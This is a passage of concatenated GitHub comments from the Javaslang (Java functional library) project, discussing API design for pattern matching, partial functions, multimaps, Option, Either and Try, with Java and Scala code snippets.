possible:\njava\nMatch(str).of(\n    Case($(\"one\"), 1),\n    Case($(\"two\"), 2),\n    Case($(), 3)\n)\nwhich is roughly equivalent to Scala's\nscala\nstr match {\n    case \"one\" => 1\n    case \"two\" => 2\n    case _ => 3\n}\nI.e. in addition to the methods\njava\nCase(Pattern, Function)\nwe need to return just values without using a lambda to calculate the result\njava\nCase(Pattern, T)\n. The final core Match API has been committed with #1167 and #1168. Further changes (adding standard patterns, predicates etc.) will be tracked in #1157.\n. Hi Rahel, mir fehlen die Worte im Englischen... Perfekt ausgef\u00fchrt und klasse dokumentiert! Ich w\u00fcrde dich sofort einstellen, wenn ich eine Firma h\u00e4tte :-))\nVielen Dank!\n. Good morning & thank you!\n. Thx!\n. We can do this already. Regarding the example above:\njava\nFunction2<String, Integer, String> g = (s, i) -> f.apply(s1, i, true);\nFunction1<Boolean, String> h = b -> f.apply(\"test\", 123, b);\nDon't know why I haven't seen that (c8\n. I think this is roughly the same as https://github.com/javaslang/javaslang/blob/b18fd49b2e5e09db4abecf4d43f62d2b0623e070/javaslang/src/main/java/javaslang/concurrent/Future.java#L422, isn't it?\n. Ok. Since the order is not predictable I see no benefit.\nsequence() is a synchronization point - the result is there, if all futures completed.\nparalles() would make only sense, if single results are accessible before all futures complete. But we do not need a wrapper for that. We can register callbacks at any single future to handle single results. To observer, if all are  completed, we could additionally fold over the futures, e.g. with a boolean value.\n. thx!\n. Just saw your PR, thank you! ~~Need to sleep - will review the changes tomorrow!~~\n. Well done! This is one master-piece beside AppendSelf and HAMT :-)\n. Thx!\n. done\n. Haha, thank you Lukas :-)\nAlready done. It is not part of javaslang core but you may use javaslang-render.\nIt supports ascii rendering:\njava\n                             \u250c\u2500\u2500\u2500\u2510\n                             \u2502Ann\u2502\n                             \u2514\u2500\u252c\u2500\u2518\n              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n           \u250c\u2500\u2500\u2534\u2500\u2510                  \u250c\u2500\u2500\u2534\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2510\n           \u2502Mary\u2502                  \u2502Peter\u2502       \u2502Christopher\u2502\n           \u2514\u2500\u2500\u252c\u2500\u2518                  \u2514\u2500\u2500\u252c\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510           \u2502\n \u250c\u2500\u2500\u2534\u2500\u2510  \u250c\u2500\u2500\u2534\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2510\n \u2502John\u2502  \u2502Karen\u2502 \u2502 Steven \u2502  \u2502 Paul  \u2502 \u2502Anthony\u2502   \u2502Samuel\u2502\n \u2514\u2500\u2500\u252c\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2518 \u2502 Abbot  \u2502  \u2502Palucci\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n    \u2502       \u2502    \u2502Braddock\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n \u250c\u2500\u2500\u2534\u2500\u2500\u2510 \u250c\u2500\u2500\u2534\u2500\u2500\u2510 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n \u2502Avila\u2502 \u2502Frank\u2502\n \u2514\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2518\nand graphviz:\n\nMore rendering solution contributions are always welcome!\n. Please note that Tree will change slightly to enable advanced tree processing (it will traverse nodes instead of elements). I also work on a new effective way to represent immutable trees with parent references (using two layers, each for one direction). See https://github.com/javaslang/javaslang/issues/1023 for more information.\n. Impl: flatMap(f)\n. Impl is different now, see #1111 \n. This Scala code\nscala\n// = List(1)\nList(Success(1), Failure(new Error())).collect { case Success(i) => i }\nshould look in Javaslang like this:\njava\nList(Success(1), Failure(new Error())).collect(Case(Success($()), i -> i))\n. ## Motivation\nWe want to apply partial functions to Traversable.collect():\njava\n// = List(\"2 is even\", \"4 is even\")\nList(1, 2, 3, 4).collect(\n    Case($(i -> i % 2 == 0), i -> i + \" is even\")\n);\nImplementation\nWe will start with the following:\njava\npublic interface PartialFunction<T, R> extends java.util.function.Function<T, R> {\n    boolean isDefinedAt(T value);\n}\nThis will allow us to define the following:\njava\npublic interface Traversable<T> {\n    //  e.g. collectionFactory.apply(iterator().filter(partialFunction::isDefinedAt).map(partialFunction::apply));\n    <R> Traversable<R> collect(PartialFunction<? super T, ? extends R> partialFunction);\n}\n(We need the notion of a partial function for Traversable.collect(). There it is sufficient to have a PartialFunction (of arity 1). Currently we do not have the use-case for PartialFunction1 to PartialFunctionN.)\nBackward-Compatibility\nIn order to be able to write list.collect(Case(..., ...)), we need to change the API.Match.Case interface. Currently we have:\njava\npublic interface Case<T, R> extends java.util.function.Function<T, javaslang.control.Option<R>> {\n}\nWe will change that in 3.0.0 to:\njava\n// OK\npublic interface Case<T, R> extends PartialFunction<T, R> {\n}\n(this will also make our Match API faster because we do not need to create Option instances when matching)\nHowever, we can't implement both in 2.1.0 because the return types Option<R> and R clash:\njava\n// COMPILE ERROR\npublic interface Case<T, R> extends java.util.function.Function<T, javaslang.control.Option<R>>, PartialFunction<T, R> {\n}\nEspecially we can solve this issue and defer the backward-incompatible change to #1111.. ~~By default we will~~ We could treat Function1 as a PartialFunction that is defined for all inputs, see total function.\n```java\n@FunctionalInterface\npublic interface Function1 extends PartialFunction {\ndefault boolean isDefinedAt(T1 t1) {\n    return true;\n}\n\ndefault Function1<T1, R> partial(Predicate<? super T1> isDefined) {\n    final Function1<T1, R> self = this;\n    return new Function1<T1, R>() {\n        @Override\n        public boolean isDefinedAt(T1 t1) {\n            return isDefined.test(t1);\n        }\n        @Override\n        public R apply(T1 t1) {\n            return self.apply(t1);\n        }\n    };\n}\n\n}\n```\n. ## Naming?\nWe have curried(), tupled(), memoized(). How do we name Function<T, R> -> PartialFunction<T, R>?\n\npartial()\npartialled()\npartially()\npartiallized()\n\nVoting results\n\n. Ruslan, would be great if you could do that!\nI'm finishing meanwhile the structural pattern matching.\n(Currently feeling like:\n\n)\n/cc @ruslansennov \n\nMoving the Seq, Map, ... tranform methods down to the implementations is the only solution that makes sense IMO. However, if a user wants to transform a HashMap he can't call Map.transform any more. He must call transform on the HashMap instance. But the Function argument forces us to use the most specific implementation. Please let me know, if you have any better ideas on that...\n. Fixed with #1104 \n. Fixed with #1102 \n. Awesome, great changes! Thx\n. There will be so much to say about final 2.0.0 - instead of developing new features we could spend one year and give StackOverflow answers on how Java 8 problems are solved with Javaslang and on writing blog posts and articles :-)\n. :+1: me too\n. probably I will be able to create a pull request for pattern matching today. Coding the last details on the code generator now...\n. Good morning!\nYes thanks, I saw that yesterday and filed #1100 - the current signature makes no sense.\nI think in our case we can even replace ? extends U with U, because U is injected by the context of the function f and method return types are co-variant in Java - but I'm not 100% sure.\n. Yep, you are right!\n. Duplicate to #1100 but contains additional information\n. Fixed with #1104\n. Awesome! Thx\n\n. Awesome, thank you!\n. Optimizations must take place with the type tree in mind. E.g. if Integer is atomic, so is Number. In order to keep the 'lookup-table' of atomic type small, we need to check inheritance relation during optimization.\nAlso we must create a directed dependency graph before optimization. We can calculate the maximum Pattern arity, when we know the maximum arity of the components.\nExample:\n``` java\nAddress(String, Integer)\n// String is atomic => max arity 1\n// Integer is atomic => max arity 1\n// => overall max arity = 2\nPerson(String, Address)\n// String is atomic => max arity 1\n// depends on Address, which has max arity 2\n// => overall max arity = 3\n```\n. Another optimization idea: compare bytecode size different types of generated files\n- interface\n- abstract class\n- final class\nthe contained methods should be all static.\nAlso:\n- does shortening the names Match.Pattern0..9 to Match.P0..9 make a difference?\n- does it make a difference if Pattern0..9 are made top-level classes?\n. Further optimization:\n- omit type hint for Pattern0.<...> create(...), if type hint has no generics\n- use primitive values in method signatures, if applicable\n- the generator will use an ImportManager. Do imports really reduce bytecode size? However, it will reduce java file size.\n- Move method bodies into static methods of Pattern0..8\nExample\njava\npublic final class MyPatterns {\n    public static <__ extends java.time.LocalDate> Pattern0 LocalDate(java.lang.Integer p1, java.lang.Integer p2, java.lang.Integer p3) {\n        return Pattern0.<java.time.LocalDate>create(java.time.LocalDate.class, t -> Xxx.LocalDate(t).transform((t1, t2, t3) -> Pattern0.equals(t1, p1).flatMap(_1 -> Pattern0.equals(t2, p2).flatMap(_2 -> Pattern0.equals(t3, p3)))));\n    }\n}\nwill be\njava\npublic interface MyPatterns {\n    static <__ extends LocalDate> P0 LocalDate(int p1, int p2, int p3) {\n        return P0.create(LocalDate.class, t -> Xxx.LocalDate(t).transform((t1, t2, t3) -> equals(t1, p1).flatMap(_1 -> equals(t2, p2).flatMap(_2 -> equals(t3, p3)))));\n    }\n}\nUpdate: Ideally, the patterns class calls\njava\npublic interface MyPatterns {\n    static <__ extends LocalDate> P0 LocalDate(int p1, int p2, int p3) {\n        return P0._ffad(LocalDate.class, My::LocalDate, p1, p2, p3);\n    }\n}\nwhere the Pattern classes P0..8 contain a list of pre-defined methods of all possible argument combinations. This allows us to externalize the maximum amount of code out of the generated Patterns classes.\nThe unapply method reference My::LocalDate has also to be passed (the class My is package private).\nExample:\njava\nabstract class P0 {\n    // lookup table _00 ... _ff\n    public static P0 _00(...) { ... }\n    ...\n}\n...\nabstract class P8 {\n    public static P8 _00(...) { ... }\n    public static P8 _01(...) { ... }\n    public static P8 _02(...) { ... }\n    ...\n    public static P8 _fe(...) { ... }\n    public static P8 _ff(...) { ... }\n}\n. This is obsolete now. The current version of Match does have 1 method per pattern.\nWe will therefore not apply any (so called) optimizations, e.g. defining atomic types. Without atomic types we have more flexibility to define match patterns for arbitrary objects.\n. Please note that a Partial Function is something different than partial function application (see #1092).\n. Already finished with #1167 and #1168.\n. I don't think this is done already. We need to follow these steps:\n1) We will use Case<T, R> as Function<T, Option<R>>\n2) Add new API that is capable to partial function application, e.g.\njava\ninterface Traversable<T> {\n    // a kind of filter and map\n    <R> Traversable<R> collect(Function<T, Option<R>> f);\n}\nand\njava\ninterface Value<T> extends Iterable<T> {\n    /**\n     * Example:\n     * Map<Integer, Character> map = HashMap.of(1, 'a', 2, 'b');\n     * map.forEach(Case(Tuple2($(), $()), (k, v) -> { System.out.println(k + \" -> \" + v); }));\n     */\n    default void forEach(Function<T, Option<Void>> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        for (T t : iterable) {\n            f.apply(t);\n        }\n    }\n}\nWe need to add new API.Case(Pattern, Consumer) methods, where\n- Consumer0 = Runnable\n- Consumer1 = Consumer\n- Consumer2 = BiConsumer\n- Consumer3..N\nThe Consumers do not exist yet. It was suggested to create a special javaslang-functions module and move Function0..N (and Consumer0..N) into that module. I'm not sure about it.\nExample:\n``` java\n// -- Pattern2\npublic static  Case Case(Pattern2 pattern, BiConsumer<? super T1, ? super T2> f) {\n    Objects.requireNonNull(pattern, \"pattern is null\");\n    Objects.requireNonNull(f, \"f is null\");\n    return new Case2<>(pattern, (t1, t2) -> { f.accept(t1, t2); return null; });\n}\n```\n. ## Update\n1) Case interface\nAs follow up of #1099 we need to change API.Match.Case:\njava\npublic interface Case<T, R> extends PartialFunction<T, R> {\n}\nThis involves a reimplementation of the Match internals (and also of the annotation based Match Pattern generator).\n2) Value.forEach\n...is out of scope. We use value.filter(...).forEach(...) instead.\n. Also change\njava\ndefault Try<T> mapFailure(Match.Case<? extends Throwable, ? extends Throwable>... cases) { ... }\nto\njava\ndefault Try<T> mapFailure(PartialFunction<? extends Throwable, ? extends Throwable>... mappers) { ... }. There is nothing to do anymore.\nCase is a PartialFunction already.\nmapFailure neither does (or will) take a Case nor does (or will) take a PartialFunction.\n. Don't see it - Values stay Serializable! Do you really use Function serialization, i.e. Function.getType()?\n. Mhh, maybe for Lazy? Then Functions will stay Serializable. However, the getType() is not needed I think.\n. Ok, extending Serializable should be sufficient, right?\nThx for the hint!\n. Reflection of Serializable Lambdas is considered harmful. I removed it.\nSee https://gist.github.com/danieldietrich/a4977c525734269348b0\n\n. Is it realy (I mean really really) needed? Why isn't isDefined sufficient?\nHowever, if we add it, we could add it to Value:\n``` java\ninterface Value {\n...\n\ndefault boolean nonEmpty() {\n    // or maybe return !isEmpty();\n    return isDefined();\n}\n\n}\n``\n. Yes, you are right, the nameisDefined` is confusing.\nJavaslang differs from Scala in the way that we centralized specific features in a common base-class, namely Value.\nValue is base-class of both single-valued and multi-valued types. For single-valued types isDefined is more intuitive, for multi-valued types nonEmpty is more intuitive.\nWe should add nonEmpty to Value to be more complete. isDefined and nonEmpty are equivalent.\n``` java\ninterface Value {\n// defined / undefined check\nisDefined()\nisEmpty()\nnonEmpty()\n\n// getters\nget()\ngetOrElse(...)\ngetXxx(...)\n\n// ...\nmap(...)\n...\n\n// pattern matching\nmatch(...)\n\n// conversion\ntoXxx()\n\n}\n```\n. Maybe you are right. I could make Value package private and remove it from the public API. Less is more. It is good to have an internal base-interface.\nisDefined will move to option, nonEmpty to traversable. Check!\n. I've thought about it and will not remove Value from public API. Even if it not frequently used in real world programs, it is a fundamental part of the the type system, like Object in Java. Value represents the functional counterpart to Object.\nHowever, I agree to move isDefined and nonEmpty as discussed. I will apply that change.\n. Thank you for your mindful suggestions!\n. It is intended to be syntactic sugar for one of the rare use-cases where we have Some(null), because null is the only instance of Void in Java.\nThe name Option.void() is not possible/a keyword, so I chose Option.nothing() because void is nothing.\nI'm currently using it in pattern matching where I return\n- Option<Void> instead of Option<Tuple0>\n- Option<T1> instead of Option<Tuple1<T1>>\n- Option<Tuple2<T1, T2>>\n- Option<Tuple3<T1, T2, T3>>\n- ...\n. Fixes #1113 \n. Incredible!\n. I do\n. travis-ci currently does not seem to work. I've also restarted another build to deploy the new io.javaslang snapshot artifacts... zzZzz\n. Good morning and thanks! Your first PR for Javaslang? Great :-))\n. Ich bin noch nicht richtig wach (wegen der ganzen Kommentare in unterschiedlichen Branches). Erstmal Kaffee++\nVielen Dank!\n. Sum and product have to take place using Long values for Integer, Short and Byte. Switching to Long revealed a bug in our Euler08 solution (right solution also here: http://blog.dreamshire.com/project-euler-8-solution/).\nExample: Let's multiply 5 byte numbers\njava\n255 * 255 * 255 * 255 * 2 = 8_456_501_250\n. Regarding the lifetime we spent (thousands of hours of hard work), it is important to me that the copyright remains at the authors of Javaslang.\nPer definition, the authors of Javaslang are part of the Javaslang organisation. Therefore the copyright should remain at the organisation. We are Javaslang.\nCopyright 2014-2016 Javaslang\nI wil change the headers accordingly.\n. Fixed\n. (IntelliJ settings are also up-to-date now)\n. Fixes #68 \n. Hi Ruslan,\nyes, that's a tough decision to make. I like the idea to have different value container types. But in order to benefit from it, the values() method should return a Traversable of the correct type. This is only possible, if the Multimap is aware of the type by specifiying an additional generic:\njava\ninterface MultiMap<K, V, TYPE extends Traversable<V>> {\n    TYPE values();\n}\nWe could have factory methods for the default-value container Set:\njava\nstatic <...> Multimap<..., Set<V>> empty();\nstatic <...> Multimap<..., Set<V>> ofEntries(...);\n...\nBecause we need appropriate create and add methods for construction and element addition, we could pre-define known Traversable types that can be used as value-containers. These enum knows all necessary operations.\n``` java\ninterface Multimap {\nenum Type {\n\n    INDEXED_SEQ(Vector::new, Vector::append),\n    LINEAR_SEQ(...),\n    SET(...),\n    SORTED_SET(...)\n\n    Type(...) {\n        ...\n    }\n}\n\nstatic Multimap<..., Set<V>> empty(Type type);\nstatic Multimap<..., Set<V>> ofEntries(Type type, ...);\n...\n\n}\n```\nTo have the most flexibility, we could provide also a factory method that allows to create arbitrary value containers:\n``` java\nstatic <...> Multimap<..., Set> empty(Supplier unit, BiFunction add);\n// maybe we omit all other factory methods for the general case to keep it simple?\n// static <...> Multimap<..., Set> ofEntries(...);\n...\n``\n. Cool, one Multimap will rule all :-)\n. Why can't we have justHashMultimap,LinkedMultimapandTreeMultimap`?\nI guess it is because Seq and Set are orthogonal return types and they can't be overridden? Do you have examples where it does not work?\nI think the Seq/Set return type problem could be solved if we make use of Kind1<..., ...> for the container type... but I have to see where it clashes.\n(Btw Kind has to be properly implemented by all Javaslang classes, I will do that)\n. | Backed by | Container | Multimap |\n| --- | --- | --- |\n| HashMap | (appropritate traversables) | HashMultimap |\n| LinkedHashMap | (appropritate traversables) | LinkedMultimap |\n| TreeMap | (appropritate traversables) | TreeMultimap |\nIf we specifiy the container type at construction type, e.g.\njava\nHashMultimap.emptyWithSeq(); // List is chosen\nHashMultimap.emptyWithSet(); // HashSet is chosen\nor\n``` java\nimport javaslang.collection.TreeMultimap.ContainerType.*;\nTreeMultimap.empty(SEQ); // List is chosen\nTreeMultimap.empty(SET); // TreeSet is chosen\n```\n. Ok - let's try to meet that date. I've s.th. todo with Match, too. If you need longer it should be no problem.\n. Until release we have two things: Pattern Matching (me on it) + Multimap (Ruslan on it). I think helping out with the features makes not much sense at this state because they are under 'heavy' development, right @ruslansennov?\nBut... tests, tests, tests! We aim 100% coverage and there is still much missing. A helping hand would be awesome!\n. great!\n. I know that feeling - 99% are straight forward, but the last 1%... I will take a look!\n. I've created a workspace with your branch and started reading the code. The type signatures of the classes / interfaces look good.\nMultimap.get(key) could return T, which is Traversable<V> and safe. Do we return an empty collection instead of an empty Option if the key is not present? Just asking, I don't know because I haven't used multimaps yet.\nI would remove the MutlimapImpl.Factory interface to save the factory instance variable (also removed). The methods of the Factory interface can be protected abstract in MultimapImpl and be overridden by subclasses.\n. > And we can't use Kind1 as return type\nI've thought about it. We should not use Kind1 or Kind2 in the Multimaps at all. It introduces problems. (It should be only used as marker interface which can be further used in javaslang-algebra.)\n. Then Option<T> get(K key); should work fine. If needed it can be Option<? extends T>. Then we can build Multimap hierarchies greater than one level (same as we've done with Traversable -> Set -> SortedSet -> TreeSet for example).\n\nFor example, Multimap.get(key) can't return Traversable because it is unsafe.\n\nI still not fully understand it. Is it not good to return Option<T> with T extends Traversable<V>? \n. Btw - I'm pretty impressed! The code looks great :-) Nice implementation.\n. Ok, now I understand. I check that...\n. It is not possible because of the lack of higher-kinded types / type constructors in Java.\nWe have two (practicable) options:\n1) Create specific implementations for all possible value container types.\n--> I'm no friend of that. I think multimaps are rarely used compared to other collections. If they count more than all other collections summed up it would not be good for the readability of the collection library.\n2) We just use Traversable<V> instead of ? extends Traversable<V>.\n--> We may add check methods for characteristics, such as\n- Traversable.isDistinct() // Set, Map\n- Traversable.isOrdered() // SortedSet, SortedMap\n- Traversable.isSequential() or isInsertionOrder() // Seq, Iterator, Tree?, LinkedHashSet?, LinkedHashMap?\nThese in conjunction with conversion methods toList, toSet etc. will provide us with all the flexibility to handle values.\nWhat do you think? 2) or 2)? ;-)\nUpdate: internally the multimap of course still uses a specific Traversable impl. I think we still need the factory instance you implemented. I will look into that tomorrow. Need sleep! The last days were a little bit exhausting...\n. Fine, looks good!\nI'm looking forward to the code review. I've seen some minor things:\n- in Multimap.forEach we need generics: default void forEach(BiConsumer<? super K,? super V> action)\n- we should consider to rename MultimapImpl to AbstractMultimap. Then it is the same as AbstractMap.\n- I'm still not convinced about the additional Lazy fields in our collections. It eats memory. I don't care about the performance of the size method. It is not needed, e.g. to iterate collections. But to get sure what is the best practice here we should take a look at other (immutable) Multimap implementations.\n- It would be great to get rid of the additional factory field:\n  - the Factory methods that return Map and Multimap can move as protected abstract methods into AbstractMultimap\n  - String containerName() is the same as emptyContainer().stringPrefix() I think (should be)\n  - I would replace the rest of the Factory (i.e. emptyContainer(), addToContainer(..) and removeFromContainer(...)) by something like this:\n``` java\n    enum Container {\n    SET(HashSet::empty, (Set<Object> set, Object elem) -> set.add(elem), (Set<Object> set, Object elem) -> set.remove(elem)),\n    SORTED_SET(TreeSet::empty, ...),\n    SEQ(List::empty, ...);\n\n    final Supplier<Traversable<?>> emptySupplier;\n    final BiFunction<Traversable<?>, Object, Traversable<?>> add;\n    final BiFunction<Traversable<?>, Object, Traversable<?>> remove;\n\n    <T> Container(Supplier<Traversable<?>> emptySupplier,\n                  BiFunction<? extends Traversable<?>, Object, Traversable<?>> add,\n                  BiFunction<? extends Traversable<T>, T, Traversable<T>> remove) {\n        this.emptySupplier = emptySupplier;\n        this.add = add;\n        this.remove = remove;\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    <T> Traversable<T> empty() {\n        return (Traversable<T>) emptySupplier.get();\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    <T> Traversable<T> add(Traversable<T> container, T elem) {\n        return (Traversable<T>) add.apply(container, elem);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    <T> Traversable<T> remove(Traversable<T> container, T elem) {\n        return (Traversable<T>) remove.apply(container, elem);\n    }\n}\n\n```\nI'm in a hurry and can't get the generics right. But should be possible somehow...\n. Hey @ruslansennov,\nI want to prepare closed shop for 2.0.0 final. Is it ok to take the Multimap to 2.1.0 which should be short after 2.0.0 (e.g. 1 month?). Then we have time to test. Once we are final with 2.0.0 I don't want to modify existing interface methods if possible. (However, I will take a last look at the Xxx.match() methods).\nThe next days I will concentrate on the web-page and the documentation.\nIs that ok for you?\n. Ok, will do it.\n. Done by Ruslan in #1240 \n. Great, we should do that!\n. @ruslansennov this issue is fixed, right?\n. :+1: \n. Good point. Java folks is used to it in the mutable case. It might be useful to ge a new instance of same type. Could be just the name empty() but need to check that thare are no name-clashes...\nThanks!\n. I will remove clear() today for now. It can be added later if really necessary as you said.\n. I've removed it and realized that we (internally) need an empty() method for abstract implementations of collections. I will take this opportunity and merge the two concepts of clear() and getEmpty() to a public empty() method.\n. While doing that change it seems that is also not the right way (beside the name clash with the existing static methods). I will make that method internal and name it emptyInstance().\n. @ruslansennov Any idea on this issue? Did you start a mvn clean test on the command line?\n. Ok! I also think it will work.\n. Awesome! I will pull this in as refactoring, no comments here.\nI put a special attention on those methods in abstract Map that don't use the generic type parameter M. But all methods fit there well. I had to think a while about the distinct(). Isn't it really bound to the specific Map implementation? But no - keys have to be a (Sorted)Set., so entries are distinct by default. However, the distinct method can't be moved as default method to the Map interface because the specific Map type isn't known there. Well done!\nFrom another viewpoint than refactoring I identified minor changes that I will apply afterwards. E.g. a isTraversableAgain() should be moved to the Map interface because a Map would be pretty useless, if I could ask it only once for a value by a key.\nMany thanks for this big effort!\n. Yes, currently there are reasons to have an alternative Optional implementation. One of the most important is the ability to serialize it.\nA mix of both Optional and Option in Javaslang is no viable alternative.\nThe creators of Optional suggest to use Optional only as intermediate computation result and not to persist the Optional state in form of an instance variable.\n. Haha, yes :)\nOption will stay but it is a pity that Java's impl isn't sufficient.\n. Ok :-)\n. Yes, thank you. The same applies to Stream.\nScala's Iterator: https://github.com/scala/scala/blob/v2.12.0-M2/src/library/scala/collection/Iterator.scala#L65-L163\nScala's Stream: https://github.com/scala/scala/blob/v2.12.0-M2/src/library/scala/collection/immutable/Stream.scala#L1196-L1250\nPR's very welcome :-)\n. Great, thanks for the helping hand!\n. Well done!\n. Not relevant for 2.0.0, will move it to 2.0.1\n. Kind* will be removed in 3.0, see #1493 \n. Great, thanks!!\n\nI couldn't run test cases in IntelliJ, had to do it on the command line, really annoying. Is this a known issue?\n\nYep, fixed on my local branch. IntelliJ does not recognize the compiler option for generated sources directory specified in the maven-compiler-plugin. I think it is an IntelliJ bug - the compiler args should be passed to IntelliJ.\nHowever, I fixed it by using the default compiler args for annotation processing. Will commit that.\n. Top!\n. @mvh77 @ruslansennov the IntelliJ problem should be fixed in some minutes with #1149 \n. Towards #1125 \n. Oh - this is an off-by-one bug.\nStream is a special case. Here we don't use AbstractIterator, because the Iterator is used internally. In the next method no extra checks are needed, because it is guaranteed that hasNext() is called before each next(). It is ok.\n. Great, thank you for the kind words and for the addition. It fits well!\n. Great, thx!\n. Ok, will go to sleep then and have a look tomorrow morning.\ngdn8!\n. great, thx :)\n. Progress:\n[\u2713] match guards (note: for now we use the inline predicates $(predicate))\n[ ] visitor for all types\n[ ] syntactic sugar for all types\n[\u2713] ~~special case for types~~ define a set of predicates\n[\u2713] annotation processor + pre-generated patterns\n. We will skip the features 'visitor for all types' and 'syntactic sugar for all types'. These will be added later if needed. Now it is closed-shop time for 2.0.0 final.\n. looks nice, thx!\n. Thank you - right, the current readme should always provide working links.\n. Thanks, Miguel! Very nice work. This is a great basis for our benchmarks. The maven poms look fine!\n. travis seems not to start at all - I will pull it in now!\n. Towards #725 \n. Where to deploy the docs? Are there free cloud-solutions?\n. Not relevant for 2.0.0. Will move it to 2.0.1.\n. I will do this when creating a new web page for v1.0.0.\nI will close this issue here now because it is not related to the core library.\nThx!. The CONTRIBUTION.md got and update. I will remove the CONTRIBUTION content from the asciidoc documentation. The documentation should be user-centric. The CONTRIBUTION is developer-centric.\n. Hi Martti,\nit was a hard decision to make some of the API unsafe. I've thoroughly thought about the safety topic while designing the API. There are too many of these methods. All numeric operations in collections (product, average, sum). All candidates xxx that have an xxxOption alternative might also fail, e.g. head, init, last, tail, reduce. The get method of all Values (e.g. Option, Try, ...) might throw NoSuchElementException - partially defined functions and so on. I bet there are more examples.\nI chose an API design that is practicable in terms of conciseness. The unsafety of ordered collections is well known from java.util.SortedSet. But there existed also API that was too unsafe and I removed it again. An example is the flatten() method which assumed that a List has type List<List<T>> for example. A static flatten method is possible but we don't have it right now.\nThese static methods are hard to maintain. They follow not the rules of inheritance. Every interface/class has to define their own. Regarding the increasing amount of collection impls this is really cumbersome work.\nLet's keep it as it is - not optimal but practicable. There are other libs for Java that try to emulate real functional languages by being pure and safe. But I think this far from being practicable. The code is hard to write and hard to read.\nAre you fine with this or does it feel wrong?\n. You are right, that would be safe. But I want to provide the same API as introduced with Java 8: Stream.sorted()\nFrom the Java 8 API docs:\n\nFor ordered streams, the sort is stable. For unordered streams, no stability guarantees are made.\n\nWe have stated this, too, at our interface:\n\nthrows ClassCastException - if this elements are not Comparable\n. Let's leave this behind us. It is not worth to put too much effort in it. Java needs ~~inference~~ implicit type constraints - otherwise all looks just as a workaround, the one or the other way.\n\nI will close this ticket.\n. :+1: \n. The background is that Either is now right-biased by default. That is a common use-case that can be also found on Scala mailing lists. Scalaz has an extra type for that but introducing a new type for the same functionality is weird.\nPlus: now Either is a real monad.\nYour can still use the left/right projections, they didn't change.\n. Please read this: http://robsscala.blogspot.de/2012/06/fixing-scalaeither-unbiased-vs-biased.html\nThis is the Xor (like in Scalaz) that has been suggested: https://github.com/javaslang/javaslang/issues/762\nAnd this is what we finally made out of it: https://github.com/javaslang/javaslang/issues/882\n. @vicmosin \n\nWould it be good to add some getLeftOrRight like get was? \n\nBut we get an Object. What is the use-case? We had that method because of a common interface for Left and Right. But does it make sense to get() an Object and we don't know what it actually is?\nWe should make the semantics explicit in our code by\njava\nEither<L, R> either = ...;\nif (either.isLeft() {\n    // call either.getLeft()\n} else {\n    // call either.get()\n}\nThat is a much cleaner way than:\njava\nEither<String, String> either = ...;\nObject obj = either.getLeftOrRight();\n// how can I now decide what was the result!?\n. Thank you! I will outline that new behavior / give it a special emphasis in the documentation to make it clear.\nThanks for reporting. If you find other odd things please let me know. I try to give the best Java 8 experience possible :-)\n. whoops, I wanted to close it, too\n. Towards #1087 \n. Towards #1087 \n. <unw00t>Subtypes still not extracted right for deeper nested examples.</unw00t>\n. Towards #1157 \n. Very nice, thang you :)\n. Thank you :-)\n. As simple as possible here because it is just a test. You may choose.\n. Thx!\n. Hi,\nyes - I see. The use case is too specific to include it into the base lib, for numerous reasons. One reason is, that the exception is fixated to NoSuchElementException.\nI have similar tasks in my programming and would suggest to do it the following way:\njava\nTry.of(httpGet(url))\n   .flatMap(r -> (r.code == 200) ? r : Try.failure(new NoSuchElementException(\"error message!\")));\nTo reduce code duplication, it might make sense to create a Responses utility class:\n``` java\nTry.of(httpGet(url)).flatMap(r -> Responses.checkCode200(r, \"error message!\"));\nclass Responses {\n    static Try check(Try it, String message) {\n        return (it.isFailure() || it.get().code == 200) ? it : Try.failure(new NoSuchElementException(message));\n    }\n}\n```\nor even better\n``` java\nTry.of(httpGet(url)).flatMap(Responses.check(r -> r.code == 200, \"error message!\"));\nclass Responses {\n    static Function<? super Try, ? extends Try> check(Predicate<? super Response> pred, String message) {\n        return it -> (it.isFailure() || pred.test(it.get())) ? it : Try.failure(new NoSuchElementException(message));\n    }\n}\n```\nIf the Responses class has to be used in different modules / projects I would create a separate artifact/jar, which contains this (+additional) stuff.\nHope that helps!\nI will close that ticket. Don't hesitate to ask if any questions.\nGreets,\nDaniel\n. Weird. I think it might have to do with pre 1.8.0_51 JDKs. I remember _51 was the first version which behaved correctly.\nThank you!\n. We should test it also with jdk 1.8.0_51 or greater. The 1.8.0_4x series had bugs...\n. Maybe also a JDK problem with version < 1.8.0_51? I think this is a JDK bug. However, we need to fix it in the tests.\n. Cool, thx!\n. Great!\n. Hi Guillermo,\nno. :-) That is contrary to the whole idea of the Try monad. The state of Try only depends on a success or a failure of a computation, reflected by the types Success and Failure. null has nothing to do with that state. Success(null).toOption() is Some(null), which is also allowed in Scala, see below.\nBut after performing some 